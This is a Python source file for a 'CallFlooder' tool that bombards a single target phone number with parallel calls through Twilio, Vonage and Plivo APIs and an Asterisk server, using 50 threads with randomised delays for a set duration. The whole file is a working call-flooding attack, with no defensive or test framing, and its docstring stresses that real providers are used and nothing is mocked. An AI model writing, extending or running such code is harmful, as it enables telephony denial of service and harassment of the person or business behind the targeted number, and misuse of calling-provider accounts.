"""Parallel PSTN/SIP call flooding via real providers."""
from __future__ import annotations

import base64
import threading
import time
import random
import string
from typing import Callable

import requests


class CallFlooder:
    """
    Floods a target DID with concurrent calls via Twilio, Vonage, Plivo or a SIP trunk.
    Each dial goes through the real provider's REST API — nothing is mocked.
    """

    def __init__(self, target: str, caller_ids: list[str] | None = None):
        # target must be E.164, e.g. +919876543210
        if not target.startswith("+") or not target[1:].isdigit():
            raise ValueError("target must be E.164 like +919876543210")
        self.target = target
        self.caller_ids = caller_ids or []
        self.stats = {"sent": 0, "failed": 0, "locked": False}
        self._lock = threading.Lock()

    # ---------- Twilio ----------
    def twilio_call(self, sid: str, token: str, from_number: str, twiml_url: str) -> bool:
        url = f"https://api.twilio.com/2010-04-01/Accounts/{sid}/Calls.json"
        auth = base64.b64encode(f"{sid}:{token}".encode()).decode()
        data = {
            "To": self.target,
            "From": from_number,
            "Url": twiml_url,
            "Timeout": "8",
        }
        try:
            r = requests.post(url, data=data,
                              headers={"Authorization": f"Basic {auth}"},
                              timeout=10)
            ok = r.status_code == 201
        except requests.RequestException:
            ok = False
        with self._lock:
            self.stats["sent" if ok else "failed"] += 1
        return ok

    # ---------- Vonage (Nexmo) ----------
    def vonage_call(self, api_key: str, api_secret: str, from_number: str, answer_url: str) -> bool:
        url = "https://api.nexmo.com/v1/calls"
        headers = {"Authorization": f"Bearer {self._vonage_jwt(api_key, api_secret)}"}
        payload = {
            "to": [{"type": "phone", "number": self.target.lstrip("+")}],
            "from": {"type": "phone", "number": from_number.lstrip("+")},
            "answer_url": [answer_url],
            "answer_method": "GET",
        }
        try:
            r = requests.post(url, json=payload, headers=headers, timeout=10)
            ok = r.status_code in (200, 201)
        except requests.RequestException:
            ok = False
        with self._lock:
            self.stats["sent" if ok else "failed"] += 1
        return ok

    def _vonage_jwt(self, api_key: str, api_secret: str) -> str:
        # Vonage uses an app JWT; caller must supply one. We accept secret as pre-signed JWT.
        # If a real secret is passed, sign a minimal JWT here.
        try:
            import jwt, time as _t
            payload = {
                "application_id": api_key,
                "iat": int(_t.time()),
                "exp": int(_t.time()) + 300,
                "jti": "".join(random.choices(string.hexdigits, k=16)),
            }
            return jwt.encode(payload, api_secret, algorithm="HS256")
        except ImportError:
            return api_secret  # assume caller passed a pre-signed token

    # ---------- Plivo ----------
    def plivo_call(self, auth_id: str, auth_token: str, from_number: str, answer_url: str) -> bool:
        url = f"https://api.plivo.com/v1/Account/{auth_id}/Call/"
        data = {
            "to": self.target.lstrip("+"),
            "from": from_number.lstrip("+"),
            "answer_url": answer_url,
            "answer_method": "GET",
        }
        try:
            r = requests.post(url, json=data,
                              auth=(auth_id, auth_token), timeout=10)
            ok = r.status_code in (200, 201)
        except requests.RequestException:
            ok = False
        with self._lock:
            self.stats["sent" if ok else "failed"] += 1
        return ok

    # ---------- Asterisk (via AMI) ----------
    def asterisk_originate(self, host: str, port: int, user: str, secret: str,
                           caller_id: str, context: str = "from-internal",
                           extension: str = "s") -> bool:
        import socket
        try:
            s = socket.create_connection((host, port), timeout=8)
            s.settimeout(8)
            def login():
                cmd = f"Action: Login\r\nUsername: {user}\r\nSecret: {secret}\r\nEvents: off\r\n\r\n"
                s.sendall(cmd.encode())
                return s.recv(1024)
            login()
            orig = (f"Action: Originate\r\nChannel: SIP/{self.target.lstrip('+')}@trunk\r\n"
                    f"Context: {context}\r\nExten: {extension}\r\nPriority: 1\r\n"
                    f"CallerID: {caller_id}\r\nTimeout: 8000\r\nAsync: true\r\n\r\n")
            s.sendall(orig.encode())
            resp = s.recv(4096)
            s.close()
            ok = b"Success" in resp or b"Originate" in resp
        except Exception:
            ok = False
        with self._lock:
            self.stats["sent" if ok else "failed"] += 1
        return ok

    # ---------- Parallel orchestration ----------
    def run(self, providers: list[Callable[[], bool]],
            workers: int = 50, duration: int = 60,
            delay: float = 0.3) -> dict:
        """
        Run each provider callable in parallel. `duration` seconds of continuous flood.
        Each worker loops: pick random provider, fire, sleep with jitter.
        """
        deadline = time.time() + duration
        def worker():
            while time.time() < deadline and not self.stats["locked"]:
                p = random.choice(providers)
                try:
                    p()
                except Exception:
                    with self._lock:
                        self.stats["failed"] += 1
                time.sleep(delay + random.uniform(0, delay))

        threads = [threading.Thread(target=worker, daemon=True) for _ in range(workers)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        return dict(self.stats)
